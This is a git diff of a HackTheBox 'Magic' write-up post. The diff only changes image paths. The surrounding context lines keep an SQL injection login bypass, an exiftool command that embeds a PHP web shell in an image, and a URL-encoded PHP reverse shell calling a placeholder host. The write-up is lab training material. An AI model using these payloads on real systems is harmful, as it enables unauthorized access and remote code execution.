@@ -3,7 +3,7 @@ title: "Magic - HackTheBox"
 date: 2020-06-05
 draft: false 
 tags: ["HackTheBox", "Writeup"]
-image: "/posts/magic/static/logo.png"
+image: "posts/magic/static/logo.png"
 ---
 ## Become User
 
@@ -33,7 +33,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Sun May 31 22:18:05 2020 -- 1 IP address (1 host up) scanned in 12.20 seconds
 ```
 It seems a very normal Linux machine, let’s go to see what can I find on port 80:
-<img src="/posts/magic/static/index_site.png" width="50%" height="50%" align="center" class="center">
+<img src="posts/magic/static/index_site.png" width="50%" height="50%" align="center" class="center">
 After a dirbuster scanning looking for .php extension I found the following pages:
 ```bash
 /index.php (Status: 200)
@@ -49,20 +49,20 @@ Go to play a bit whit it!
 
 ### —- SQLi bypass —-
 For the test to an SQLi point, I like to see the application’s behavior through Burp, I try to understand if it is vulnerable.
-<img src="/posts/magic/static/login_burp.png" width="60%" height="60%" align="center" class="center">
+<img src="posts/magic/static/login_burp.png" width="60%" height="60%" align="center" class="center">
 After some tests I found the easiest way to abuse the SQLi, modifying the post’s arguments as follow:
 ```
 username=' -- -&password=random
 ```
 
 Nice, now I am in front of an Upload form!
-<img src="/posts/magic/static/upload.png" width="35%" height="35%" align="center" class="center">
+<img src="posts/magic/static/upload.png" width="35%" height="35%" align="center" class="center">
 
 ### —- Upload with magic —-
 When I see an upload form I always rejoice, normally they give great emotions.
 
 This specific upload form initially it seemed to me insuperable, every tries to upload a malformed file to get a “web shell” were blocked whit the following popup:
-<img src="/posts/magic/static/upload_error.png" width="45%" height="45%" align="center" class="center">
+<img src="posts/magic/static/upload_error.png" width="45%" height="45%" align="center" class="center">
 
 The security logic behind the form always checked:
 * The final extension (allowed: png, jpg, jpeg)
@@ -83,7 +83,7 @@ exiftool -documentname='<?php echo shell_exec($_GET["e"]." 2>&1"); infophp();?>'
 ```
 http://10.10.10.185/images/uploads/image.php.jpeg?e=php+-r+%27$sock%3dfsockopen(%22MY-IP%22,MY-PORT)%3bexec(%22/bin/sh+-i+%3C%263+%3E%263+2%3E%263%22)%3b%2
 ```
-<img src="/posts/magic/static/first_shell.png" width="45%" height="45%" align="center" class="center">
+<img src="posts/magic/static/first_shell.png" width="45%" height="45%" align="center" class="center">
 
 ### —- Search for interesting info —-
 
@@ -124,14 +124,14 @@ ssh theseus@10.10.10.185
 At this point, I spent some time around the machine to try to find a miss configuration or something that allow me to become root.
 At the end of my research, I found an interesting non-standard SUID thanks to the following python script. ([LINK](https://github.com/Anon-Exploiter/SUID3NUM/blob/master/suid3num.py))
 
-<img src="/posts/magic/static/sui_enum.png" width="45%" height="45%" align="center" class="center">
+<img src="posts/magic/static/sui_enum.png" width="45%" height="45%" align="center" class="center">
 
 A non-standard SUID could be a possible attack vector, I need more information about /bin/sysinfo
 
 A good way that I thought to see if and which executables are called by /bin/sysinfo it’s to use the "strings" command on it.
 
 
-<img src="/posts/magic/static/sysinfo.png" width="45%" height="45%" align="center" class="center">
+<img src="posts/magic/static/sysinfo.png" width="45%" height="45%" align="center" class="center">
 In the red box, I can see three different commands that are executed by /bin/sysinfo. NICE, IT’S TIME TO CREATE A FAKE EXECUTABLE!
 
 ### —- Privilege Escalation Using PATH Variable —-
@@ -153,4 +153,4 @@ I have just to open a listening port before run /bin/sysinfo and a new root shel
 
 
 
-<img src="/posts/magic/static/root.png" width="45%" height="45%" align="center" class="center">
+<img src="posts/magic/static/root.png" width="45%" height="45%" align="center" class="center">
